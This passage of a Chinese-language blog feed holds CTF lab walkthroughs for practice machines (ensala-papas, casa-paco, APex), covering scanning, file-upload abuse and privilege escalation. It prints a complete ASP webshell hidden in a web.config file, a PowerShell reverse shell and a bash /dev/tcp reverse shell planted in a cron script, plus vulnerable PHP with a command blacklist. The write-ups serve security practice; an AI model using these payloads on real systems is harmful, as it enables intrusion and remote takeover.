|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 148.15 seconds
                                              
```

目前为止，感兴趣的端口有 **80**、**445，**  windwos的靶机445的优先级高于80，所以我们先测试445端口有没有利用点

---

# 2.踩点

## 2.1 port 445

```bash
┌──(kali㉿kali)-[~/test]
└─$ netexec smb 192.168.205.221 -u guest -p '' --shares
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)                                                                                                            
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [-] WIN-4QU3QNHNK7E\guest: STATUS_LOGON_FAILURE 
                                                                                                    
```

它没有开放访客登录，所以可以直接去观察80端口了

## 2.2 port 80

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.221 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x aspx,asp,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.221
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              asp,html,txt,md,aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/*checkout*.aspx      (Status: 400) [Size: 20]
/zoc.aspx             (Status: 200) [Size: 1159]
/*docroot*.aspx       (Status: 400) [Size: 20]
/*.aspx               (Status: 400) [Size: 20]
/http%3A%2F%2Fwww.aspx (Status: 400) [Size: 20]
/**http%3a.aspx       (Status: 400) [Size: 20]
/q%26a.aspx           (Status: 400) [Size: 20]
/http%3A.aspx         (Status: 400) [Size: 20]
/*http%3A.aspx        (Status: 400) [Size: 20]
/http%3A%2F%2Fyoutube.aspx (Status: 400) [Size: 20]
/http%3A%2F%2Fblogs.aspx (Status: 400) [Size: 20]
Progress: 345575 / 7642998 (4.52%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 345933 / 7642998 (4.53%)
===============================================================
Finished
===============================================================

```

扫到一个`/zoc.aspx`，去浏览器查看了一下，是一个上传页，并在注释发现了一个目录路径`/Subiditosdetono/`，当我们把目录加入网址会看到如下内容

![image](https://github.com/user-attachments/assets/b3e461b5-23c7-4dfc-b908-ba7fea785815)

我们可以看到有一个`config`文件，当我们点击时会发现**404**无法访问，那我们还是回上传页试试能不能上传**shell**

![image](https://github.com/user-attachments/assets/bd39753c-d756-4346-b2a8-d921cc8ecfd2)

不允许我们上传`.aspx`后缀的文件，根据之前访问`/Subiditosdetono/`看到有`config`文件，我们可以从中知道，可以上传`config`文件，我们去[hacktricks](https://book.hacktricks.xyz/)搜索一下看`config`文件可不可以做`shell`

![image](https://github.com/user-attachments/assets/3d2656b4-ae69-493a-b8f7-8e99ea490bdd)

找到了一点有意思的东西，我们把它的示例[复制](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)下来，上传运行

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat web.config 
&lt;?xml version='1.0' encoding='UTF-8'?&gt;
&lt;configuration&gt;
   &lt;system.webServer&gt;
      &lt;handlers accessPolicy='Read, Script, Write'&gt;
         &lt;add name='web_config' path='*.config' verb='*' modules='IsapiModule' scriptProcessor='%windir%\system32\inetsrv\asp.dll' resourceType='Unspecified' requireAccess='Write' preCondition='bitness64' /&gt;       
      &lt;/handlers&gt;
      &lt;security&gt;
         &lt;requestFiltering&gt;
            &lt;fileExtensions&gt;
               &lt;remove fileExtension='.config' /&gt;
            &lt;/fileExtensions&gt;
            &lt;hiddenSegments&gt;
               &lt;remove segment='web.config' /&gt;
            &lt;/hiddenSegments&gt;
         &lt;/requestFiltering&gt;
      &lt;/security&gt;
   &lt;/system.webServer&gt;
&lt;/configuration&gt;
&lt;!--
&lt;% Response.write('-'&amp;'-&gt;')%&gt;
&lt;%
Set oScript = Server.CreateObject('WSCRIPT.SHELL')
Set oScriptNet = Server.CreateObject('WSCRIPT.NETWORK')
Set oFileSys = Server.CreateObject('Scripting.FileSystemObject')

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject('WScript.Shell')
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%&gt;

&lt;BODY&gt;
&lt;FORM action='' method='GET'&gt;
&lt;input type='text' name='cmd' size=45 value='&lt;%= szCMD %&gt;'&gt;
&lt;input type='submit' value='Run'&gt;
&lt;/FORM&gt;

&lt;PRE&gt;
&lt;%= '\\' &amp; oScriptNet.ComputerName &amp; '\' &amp; oScriptNet.UserName %&gt;
&lt;%Response.Write(Request.ServerVariables('server_name'))%&gt;
&lt;p&gt;
&lt;b&gt;The server's port:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables('server_port'))%&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;b&gt;The server's software:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables('server_software'))%&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;b&gt;The server's software:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables('LOCAL_ADDR'))%&gt;
&lt;% szCMD = request('cmd')
thisDir = getCommandOutput('cmd /c' &amp; szCMD)
Response.Write(thisDir)%&gt;
&lt;/p&gt;
&lt;br&gt;
&lt;/BODY&gt;



&lt;%Response.write('&lt;!-'&amp;'-') %&gt;
--&gt;
        
```

![image](https://github.com/user-attachments/assets/2ab0ece6-4187-4cc6-93dd-610a3eb4cfdc)

弹个**shell**回来

```bash
powershell -nop -c '$client = New-Object System.Net.Sockets.TCPClient('192.168.205.141',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

#攻击机
┌──(kali㉿kali)-[~/test/netcat]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.221] 49159
whoami
win-4qu3qnhnk7e\info
```

---

# 3.提权

拿到**shell**后看看权限

```bash
PS C:\users\info&gt; whoami /priv

INFORMACI?N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci?n                                  Estado     
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci?n de recorrido             Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci?n Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado

```

我们有 `SeImpersonatePrivilege`权限，所以我们可以使用 **[JuicyPotato](https://github.com/ohpe/juicy-potato)** 工具来提升权限。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_ensala-papas.html</guid><pubDate>Fri, 27 Jun 2025 09:33:53 +0000</pubDate></item><item><title>thl_casa-paco</title><link>https://7r1UMPHK.github.io/post/thl_casa-paco.html</link><description># thl_casa-paco

# 0.简介

**靶机**：[thehackerslabs - casa-paco](https://thehackerslabs.com/casa-paco/)
**难度**：初学者
**目标 IP**：192.168.205.137
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.137
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 09:41 CST
Nmap scan report for 192.168.205.137
Host is up (0.00084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:E2:C1:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.81 seconds

```

先看**80端口**，**22端口**候补

# 2.踩点

![image](https://github.com/user-attachments/assets/dc05800a-1c1f-4dc3-8f59-5866ab2d2370)

把域名加入`hosts`

![image](https://github.com/user-attachments/assets/4470ec18-041e-40c9-9b97-c5a3c0536d5c)

是个点餐的网站，你按照它的提示一直点到下单页，你发现`Plato`可以**执行命令**，但是有**限制**，连`ls`都无法执行,并且**无法绕过**，爆破一下可执行命令

```bash
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -c -u 'http://casapaco.thl/llevar.php' -w /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt --hc 404 -d 'name=a&amp;dish=FUZZ' --hw 89,75
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://casapaco.thl/llevar.php
Total requests: 475254

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                            
=====================================================================

000000023:   200        32 L     109 W      1276 Ch     'w'                                                                
000000110:   200        36 L     126 W      1478 Ch     'df'                                                               
000000125:   200        33 L     95 W       1184 Ch     'du'                                                               
000000238:   200        31 L     92 W       1202 Ch     'id'                                                               
000000435:   200        50 L     170 W      1814 Ch     'ps'                                                               
000000394:   200        31 L     90 W       1156 Ch     'od'                                                               
000000513:   200        70 L     390 W      5108 Ch     'ss'                                                               
000000601:   200        31 L     93 W       1172 Ch     'wc'                                                               
000000581:   200        32 L     173 W      3792 Ch     'vi'                                                               
000001112:   200        59 L     265 W      2439 Ch     'apt'                                                              
000001160:   200        34 L     110 W      1476 Ch     'arp'                                                              
000002956:   200        31 L     95 W       1215 Ch     'dir'  
（省略）
```

发现可以执行`dir`

![image](https://github.com/user-attachments/assets/bd300755-3984-4cff-aac8-c71f3c82033a)

当你`dir`，你就会发现有一个叫`llevar1.php`的页面（爆破不出来，只可以这样看），你可以使用`od`工具查看他文本

![image](https://github.com/user-attachments/assets/415d48a5-ba24-4df3-a6f3-893788a9ea68)

我直接放**可读版本**了，想看原版的，自己执行一下

```bash
&lt;!DOCTYPE html&gt;
&lt;html lang='es'&gt;
&lt;head&gt;
    &lt;meta charset='UTF-8'&gt;
    &lt;meta name='viewport' content='width=device-width, initial-scale=1.0'&gt;
    &lt;title&gt;Casa Paco - Para Llevar&lt;/title&gt;
    &lt;link rel='stylesheet' href='static/styles.css'&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;header&gt;
        &lt;h1&gt;Casa Paco - Pedido para Llevar&lt;/h1&gt;
    &lt;/header&gt;

    &lt;main&gt;
        &lt;h2&gt;Haz tu pedido para llevar&lt;/h2&gt;
        &lt;form action='llevar.php' method='POST' class='order-form'&gt;
            &lt;label for='name'&gt;Nombre:&lt;/label&gt;
            &lt;input type='text' id='name' name='name' placeholder='Tu nombre' required&gt;&lt;br&gt;
          
            &lt;label for='dish'&gt;Plato:&lt;/label&gt;
            &lt;input type='text' id='dish' name='dish' placeholder='Ejemplo: Pizza' required&gt;&lt;br&gt;
          
            &lt;button type='submit' class='btn'&gt;Enviar Pedido&lt;/button&gt;
        &lt;/form&gt;

        &lt;?php
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            $name = htmlspecialchars($_POST['name']); // Sanitizamos para evitar errores visuales
            $dish = $_POST['dish']; // Intencionalmente sin sanitizar para la vulnerabilidad

            // Comando vulnerable
            $output = shell_exec('$dish');

            echo '&lt;section class='confirmation'&gt;';
            echo '&lt;h3&gt;Pedido confirmado&lt;/h3&gt;';
            echo '&lt;p&gt;Gracias, &lt;strong&gt;$name&lt;/strong&gt;. Tu pedido de &lt;strong&gt;$dish&lt;/strong&gt; está listo para llevar.&lt;/p&gt;';
            echo '&lt;h3&gt;Salida del Comando:&lt;/h3&gt;';
            echo '&lt;pre&gt;$output&lt;/pre&gt;';
            echo '&lt;/section&gt;';
        }
        ?&gt;
    &lt;/main&gt;

    &lt;footer&gt;
        &lt;p&gt;&amp;copy; 2025 Casa Paco. Todos los derechos reservados.&lt;/p&gt;
    &lt;/footer&gt;
&lt;/body&gt;
&lt;/html&gt;
```

实现的和`llevar.php`一样，但是他没有**限制**，但是你不**锁死**这个网页，他就会把你的命令交给`llevar.php`执行，就寄寄，下面是`llevar.php`的代码

```bash
&lt;!DOCTYPE html&gt;
&lt;html lang='es'&gt;
&lt;head&gt;
    &lt;meta charset='UTF-8'&gt;
    &lt;meta name='viewport' content='width=device-width, initial-scale=1.0'&gt;
    &lt;title&gt;Casa Paco - Pedido para Llevar&lt;/title&gt;
    &lt;link rel='stylesheet' href='static/styles.css'&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;header&gt;
        &lt;h1&gt;Casa Paco - Pedido para Llevar&lt;/h1&gt;
    &lt;/header&gt;

    &lt;main&gt;
        &lt;h2&gt;Haz tu pedido para llevar&lt;/h2&gt;
        &lt;form action='llevar.php' method='POST' class='order-form'&gt;
            &lt;label for='name'&gt;Nombre:&lt;/label&gt;
            &lt;input type='text' id='name' name='name' placeholder='Tu nombre' required&gt;&lt;br&gt;

            &lt;label for='dish'&gt;Plato:&lt;/label&gt;
            &lt;input type='text' id='dish' name='dish' placeholder='Ejemplo: Cocido' required&gt;&lt;br&gt;

            &lt;button type='submit' class='btn'&gt;Enviar Pedido&lt;/button&gt;
        &lt;/form&gt;
    &lt;/main&gt;

    &lt;?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $name = htmlspecialchars($_POST['name']);
        $dish = $_POST['dish'];

        // Filtrar comandos potencialmente peligrosos
        $blacklist_pattern = '/\b(whoami|ls|pwd|cat|sh|bash)\b/i';
        if (preg_match($blacklist_pattern, $dish)) {
            die('&lt;p style='color: red;'&gt;Error: Pedido comprometido.&lt;/p&gt;');
        }

        // Permitir solo caracteres válidos
        $allowed_pattern = '/^[a-zA-Z0-9\s\-_\.]+$/';
        if (!preg_match($allowed_pattern, $dish)) {
            die('&lt;p style='color: red;'&gt;Error: Pedido contiene caracteres no permitidos.&lt;/p&gt;');
        }

        // Ejecutar comando (no debe ser usado en un entorno de producción sin validaciones más estrictas)
        $output = shell_exec($dish);
        echo '&lt;section class='confirmation'&gt;';
        echo '&lt;h3&gt;Pedido confirmado&lt;/h3&gt;';
        echo '&lt;p&gt;Gracias, &lt;strong&gt;$name&lt;/strong&gt;. Tu pedido de &lt;strong&gt;$dish&lt;/strong&gt; estará listo para llevar.&lt;/p&gt;';
        echo '&lt;h3&gt;Salida del Comando:&lt;/h3&gt;';
        echo '&lt;pre&gt;$output&lt;/pre&gt;';
        echo '&lt;/section&gt;';
    }
    ?&gt;
  
    &lt;footer&gt;
        &lt;p&gt;&amp;copy; 2025 Casa Paco. Todos los derechos reservados.&lt;/p&gt;
    &lt;/footer&gt;
&lt;/body&gt;
&lt;/html&gt;

```

那就简单了我们锁死`llevar1.php`提交命令就好了

![image](https://github.com/user-attachments/assets/fb94c611-0f65-4b33-922d-a52e4292dd06)

要进行**base64绕过**，不然执行不了

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                                  
listening on [any] 8888 ...
id
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.137] 45002
bash: cannot set terminal process group (534): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Thehackerslabs-CasaPaco:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
www-data@Thehackerslabs-CasaPaco:/var/www/html$ cd /home/
www-data@Thehackerslabs-CasaPaco:/home$ ls -la
total 12
drwxr-xr-x  3 root        root        4096 Jan 14 16:52 .
drwxr-xr-x 18 root        root        4096 Jan 13 14:47 ..
drwxr-xr-x  3 pacogerente pacogerente 4096 Jan 14 17:08 pacogerente
www-data@Thehackerslabs-CasaPaco:/home$ cd pacogerente/
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ ls -al
total 36
drwxr-xr-x 3 pacogerente pacogerente 4096 Jan 14 17:08 .
drwxr-xr-x 3 root        root        4096 Jan 14 16:52 ..
lrwxrwxrwx 1 root        root           9 Jan 14 16:58 .bash_history -&gt; /dev/null
-rw-r--r-- 1 pacogerente pacogerente  220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 pacogerente pacogerente 3526 Mar 29  2024 .bashrc
drwxr-xr-x 3 pacogerente pacogerente 4096 Jan 13 20:24 .local
-rw-r--r-- 1 pacogerente pacogerente  807 Mar 29  2024 .profile
-rwxrw-rw- 1 pacogerente pacogerente  110 Jan 14 16:57 fabada.sh
-rw-r--r-- 1 root        root        2417 Jan 15 03:06 log.txt
-rw-r--r-- 1 pacogerente pacogerente   33 Jan 14 17:06 user.txt
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh
#!/bin/bash

# Generar un log de actividad
echo 'Ejecutado por cron el: $(date)' &gt;&gt; /home/pacogerente/log.txt

```

写个脚本覆盖掉`fabada.sh`就行了（不要问我为什么不看`pspy`，我看它长的都像定时任务☝( ◠‿◠ )☝）

```bash
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ echo -e '#!/bin/bash\n/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.141/8889 0&gt;&amp;1' &gt; fabada.
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh 
#!/bin/bash
/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.141/8889 0&gt;&amp;1
```

等一会，它定时挺快的

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8889
listening on [any] 8889 ...
iconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.137] 42802
bash: no se puede establecer el grupo de proceso de terminal (4096): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
root@Thehackerslabs-CasaPaco:~# d
id
uid=0(root) gid=0(root) grupos=0(root)

```

下班。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_casa-paco.html</guid><pubDate>Fri, 27 Jun 2025 09:33:50 +0000</pubDate></item><item><title>nyx_APex</title><link>https://7r1UMPHK.github.io/post/nyx_APex.html</link><description># nyx_APex

# 0.简介

**靶机**：[vulnyx - APex](https://vulnyx.com/file/APex.php)
**难度**：Easy
**目标 IP**：192.168.205.148
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.148
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 19:17 CST
Nmap scan report for 192.168.205.148
Host is up (0.00026s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
79/tcp open  finger
80/tcp open  http
MAC Address: 08:00:27:8E:D9:36 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds

```

其中79是我没有见过的服务，优先级最高

# 2.踩点

在hacktricks搜索到了相关[网页](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-finger.html#79---pentesting-finger)

![Image](https://github.com/user-attachments/assets/f8704be5-49b0-4ede-8d26-fae86b96ee0a)

有Metasploit的脚本，我们优先利用一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ msfconsole
msf6 &gt; use auxiliary/scanner/finger/finger_users
msf6 auxiliary(scanner/finger/finger_users) &gt; show options 

Module options (auxiliary/scanner/finger/finger_users):

   Name        Current Setting                        Required  Description
   ----        ---------------                        --------  -----------
   RHOSTS                                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metas
                                                                ploit/basics/using-metasploit.html
   RPORT       79                                     yes       The target port (TCP)
   THREADS     1                                      yes       The number of concurrent threads (max one per host)
   USERS_FILE  /usr/share/metasploit-framework/data/  yes       The file that contains a list of default UNIX accounts.
               wordlists/unix_users.txt


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/finger/finger_users) &gt; set RHOSTS 192.168.205.148
RHOSTS =&gt; 192.168.205.148
msf6 auxiliary(scanner/finger/finger_users) &gt; run
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: _apt
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: backup
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: bin
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: daemon
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: dnsmasq
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: games
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: gnats
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: irc
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: list
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: lp
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: mail
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: man
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: messagebus
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: news
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: nobody
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: proxy
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: root
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sshd
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sync
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sys
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-coredump
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-network
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-resolve
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-timesync
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uucp
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uuidd
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: www-data
[+] 192.168.205.148:79    - 192.168.205.148:79 Users found: _apt, backup, bin, daemon, dnsmasq, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, proxy, root, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, uucp, uuidd, www-data
[*] 192.168.205.148:79    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

提取数据进行爆破

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat user |awk -F ': ' '{print $2}'
_apt
backup
bin
daemon
dnsmasq
games
gnats
irc
list
lp
mail
man
messagebus
news
nobody
proxy
root
sshd
sync
sys
systemd-coredump
systemd-network
systemd-resolve
systemd-timesync
uucp
uuidd
www-data
┌──(kali㉿kali)-[~/test]
└─$ while read -r user; do echo '$user' | nc -vn 192.168.205.148 79; done &lt; user
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: _apt                             Name: 
Directory: /nonexistent                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: backup                           Name: backup
Directory: /var/backups                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: bin                              Name: bin
Directory: /bin                         Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: daemon                           Name: daemon
Directory: /usr/sbin                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: dnsmasq                          Name: dnsmasq
Directory: /var/lib/misc                Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: games                            Name: games
Directory: /usr/games                   Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: gnats                            Name: Gnats Bug-Reporting System (admin)
Directory: /var/lib/gnats               Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: irc                              Name: ircd
Directory: /run/ircd                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: list                             Name: Mailing List Manager
Directory: /var/list                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: lp                               Name: lp
Directory: /var/spool/lpd               Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: mail                             Name: mail
Directory: /var/mail                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: man                              Name: man
Directory: /var/cache/man               Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: messagebus                       Name: 
Directory: /nonexistent                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: news                             Name: news
Directory: /var/spool/news              Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: nobody                           Name: nobody
Directory: /nonexistent                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: proxy                            Name: proxy
Directory: /bin                         Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: root                             Name: root
Directory: /root                        Shell: /bin/bash
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: sshd                             Name: 
Directory: /run/sshd                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: sync                             Name: sync
Directory: /bin                         Shell: /bin/sync
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: sys                              Name: sys
Directory: /dev                         Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: systemd-coredump                 Name: systemd Core Dumper
Directory: /                            Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: systemd-network                  Name: systemd Network Management
Directory: /run/systemd                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: systemd-resolve                  Name: systemd Resolver
Directory: /run/systemd                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: systemd-timesync                 Name: systemd Time Synchronization
Directory: /run/systemd                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: uucp                             Name: uucp
Directory: /var/spool/uucp              Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: uuidd                            Name: 
Directory: /run/uuidd                   Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: www-data                         Name: www-data
Directory: /var/www                     Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.

```

没有有意思的东西，我们去看看Web服务吧

![Image](https://github.com/user-attachments/assets/0729089c-c77a-498c-919d-b511a966991b)

没有有意思的东西，源码也没有，我们去爆破目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u 'http://192.168.205.148' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.148
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,md,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/backup               (Status: 401) [Size: 462]
/index.html           (Status: 200) [Size: 878]
/server-status        (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]

```

![Image](https://github.com/user-attachments/assets/0b5297e8-5474-4c34-a645-bc01e1b882d7)

好像找到重点了，扫描一下架构

```bash
┌──(kali㉿kali)-[~/test]
└─$ nuclei -u 192.168.205.148                      

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.8

                projectdiscovery.io

[WRN] Found 2 templates with runtime error (use -validate flag for further examination)
[INF] Current nuclei version: v3.3.8 (latest)
[INF] Current nuclei-templates version: v10.1.2 (latest)
